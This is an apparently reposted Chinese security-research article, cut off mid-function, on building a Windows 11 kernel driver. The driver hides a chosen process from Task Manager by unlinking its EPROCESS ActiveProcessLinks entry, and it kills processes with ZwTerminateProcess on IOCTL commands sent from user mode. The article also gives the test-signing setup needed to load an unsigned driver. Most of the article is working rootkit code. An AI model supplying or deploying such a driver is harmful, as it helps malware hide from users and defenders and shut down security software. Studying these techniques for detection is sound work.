---
title: 【安全研究】使用内核驱动程序来隐藏和终止进程
url: https://mp.weixin.qq.com/s/IBZITOzGJYMVo4Be7_pb7Q
source: Doonsec's feed
date: 2026-02-27
fetch_date: 2026-02-28T03:58:57.467584
---

# 【安全研究】使用内核驱动程序来隐藏和终止进程

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/IRUJvvhticxQncKREqoYQoZLF0uqvQUFtzNLiadAU2osBibricsrVYH2ksMZk15FanJiaa8nibd7ib1Qkm9UUm77dLXncq58sdniaLUdCHPfXe9zBf8/0?wx_fmt=jpeg)

# 【安全研究】使用内核驱动程序来隐藏和终止进程

原创

安全研究员
安全研究员

CppGuide

![]()

在小说阅读器中沉浸阅读

在本文中，我们将探讨如何使用Windows内核模式驱动程序来隐藏和终止进程。

配置Windows 11虚拟机，确保安全启动已禁用。使用bcdedit启用测试签名模式，以便我们安装未签名的内核驱动程序。

```
bcdedit /debug on
bcdedit /set testsigning on
```

你需要计算ActiveProcessLinks数据结构的偏移量。我正在Windows 11 24H2虚拟机上对此进行测试。

```
0: kd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x1c8 ProcessLock      : _EX_PUSH_LOCK
   +0x1d0 UniqueProcessId  : Ptr64 Void
   +0x1d8 ActiveProcessLinks : _LIST_ENTRY
```

在我们的Windows 11 24H2系统上，可以看到偏移量是0x1d8。

在Visual Studio中创建一个内核驱动程序项目，并导入以下内容。为简洁起见，此代码硬编码了进程ID（PID）值。这是将从任务管理器中隐藏的PID。

```
#include <Ntifs.h>
#include <ntddk.h>

VOID HideProcessByPid(ULONG pidToHide);

NTSTATUS DriverUnload(_In_ PDRIVER_OBJECT driverObject) {
    UNREFERENCED_PARAMETER(driverObject);
    KdPrint(("[+] Unloading driver\n"));
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT driverObject, _In_ PUNICODE_STRING registryPath) {
    UNREFERENCED_PARAMETER(registryPath);
    KdPrint(("[+] Driver loaded\n"));
    driverObject->DriverUnload = DriverUnload;

    ULONG pidToHide = 9636;
    KdPrint(("[+] Calling Hide Process...\n"));
    HideProcessByPid(pidToHide);
    KdPrint(("[+] Called Hide Process\n"));
    return STATUS_SUCCESS;
}

VOID HideProcessByPid(ULONG pidToHide) {
    PEPROCESS targetProcess = NULL;
    PLIST_ENTRY activeProcLinks;
    PLIST_ENTRY prevEntry, nextEntry;

    KdPrint(("[+] Looking up process...\n"));

    if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)pidToHide, &targetProcess))) {
        KdPrint(("[+] Lookup worked\n"));

        // 0x1d8 = Windows 11 24H2 ActiveLinks Offset
        activeProcLinks = (PLIST_ENTRY)((ULONG_PTR)targetProcess + 0x1d8);

        prevEntry = activeProcLinks->Blink;
        nextEntry = activeProcLinks->Flink;

        DbgPrint("[*] targetProcess: %p\n", targetProcess);
        DbgPrint("[*] activeProcLinks: %p\n", activeProcLinks);
        DbgPrint("[*] prevEntry: %p\n", prevEntry);
        DbgPrint("[*] nextEntry: %p\n", nextEntry);

        // Unlink the process from the list
        prevEntry->Flink = nextEntry;
        nextEntry->Blink = prevEntry;
        ObDereferenceObject(targetProcess);

        KdPrint(("[-] Process with PID %d hidden\n", pidToHide));
    }
    else {
        KdPrint(("[-] Failed to find process with PID %d\n", pidToHide));
    }
}
```

请确保编译驱动程序的调试版本（而非发布版本），因为这样我们才能看到正在打印的调试消息。

使用sc 启动驱动程序。

```
C:\>sc create MyDriver type= kernel binPath= C:\MyDriver.sys
[SC] CreateService SUCCESS

C:\Users\user\Desktop>sc start MyDriver

SERVICE_NAME: MyDriver
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              :
```

微软DebugView可用于查看驱动程序打印的调试消息。

在DebugView中，进入“Capture”菜单，并确保勾选以下选项。

* Capture Kernel\_
* Capture Win32\_
* Capture Global Win32\_
* Pass-Through\_

驱动程序加载后，你应该会看到它识别出进程句柄、ActiveProcessLinks偏移量以及指向前后进程项的指针。

此时，我们在代码中指向的PID将在任务管理器中隐藏。

## 与用户模式下的进程通信

我们不必保留硬编码的PID值，而是可以编写一个用户模式应用程序，该程序能够通过IOCTL（输入/输出控制）与内核驱动程序进行通信。

要发送和接收这些请求，需使用DeviceIoControl函数并附带以下参数。

```
DeviceIoControl(
    hDevice,               // handle to device (from CreateFile)
    IOCTL_MY_COMMAND,      // control code (IOCTL)
    inputBuffer,           // pointer to input buffer (optional)
    inputBufferSize,       // size of input buffer
    outputBuffer,          // pointer to output buffer (optional)
    outputBufferSize,      // size of output buffer
    &bytesReturned,        // bytes returned
    NULL                   // overlapped (for async)
);
```

此外，我们还将添加使用ZwTerminateProcess例程终止进程的功能。

**驱动程序代码**

```
#include <Ntifs.h>
#include <ntddk.h>

#define IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KILL_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define PROCESS_TERMINATE 0x0001

VOID HideProcessByPid(ULONG pidToHide);
NTSTATUS KillProcessByPid(ULONG pidToKill);

NTSTATUS DriverUnload(_In_ PDRIVER_OBJECT driverObject) {
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\DosDevices\\HideProc");

    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(driverObject->DeviceObject);

    KdPrint(("[+] Unloading driver\n"));
    return STATUS_SUCCESS;
}

NTSTATUS DriverCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG controlCode = stack->Parameters.DeviceIoControl.IoControlCode;
    ULONG inputLen = stack->Parameters.DeviceIoControl.InputBufferLength;

    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;

    if (inputLen == sizeof(ULONG)) {
        ULONG pid = *(ULONG*)Irp->AssociatedIrp.SystemBuffer;

        switch (controlCode) {
        case IOCTL_HIDE_PROCESS:
            KdPrint(("[+] IOCTL_HIDE_PROCESS received for PID %u\n", pid));
            HideProcessByPid(pid);
            status = STATUS_SUCCESS;
            break;

        case IOCTL_KILL_PROCESS:
            KdPrint(("[+] IOCTL_KILL_PROCESS received for PID %u\n", pid));
            status = KillProcessByPid(pid);
            break;

        default:
            KdPrint(("[-] Unknown IOCTL code: 0x%08X\n", controlCode));
            break;
        }

        Irp->IoStatus.Information = 0;
    }
    else {
        KdPrint(("[-] Invalid input size: %u\n", inputLen));
        status = STATUS_BUFFER_TOO_SMALL;
    }

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT driverObject, _In_ PUNICODE_STRING registryPath) {
    PDEVICE_OBJECT deviceObject = NULL;
    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\HideProcDevice");
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\DosDevices\\HideProc");

    UNREFERENCED_PARAMETER(registryPath);

    NTSTATUS status = IoCreateDevice(
        driverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("[-] Failed to create device (0x%08X)\n", status));
        return status;
    }

    status = IoCreateSymbolicLink(&symLink, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(deviceObject);
        KdPrint(("[-] Failed to create symbolic link (0x%08X)\n", status));
        return status;
    }

    driverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
    driverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateClose;
    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceControl;

    driverObject->DriverUnload = DriverUnload;

    KdPrint(("[+] Driver loaded\n"));
    return STATUS_SUCCESS;

}

NTSTATUS KillProcessByPid(ULONG pidToKill)
{
    NTSTATUS status;
    HANDLE processHandle;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId;

    InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pidToKill;
    clientId.UniqueThread = NULL;

    // Open a handle to the process
    status = ZwOpenProcess(&processHandle, PROCESS_TERMINATE, &objAttr, &clientId);
    if (!NT_SUCCESS(status)) {
        KdPrint(("[-] ZwOpenProcess failed for PID %u: 0x%X\n", pidToKill, status))...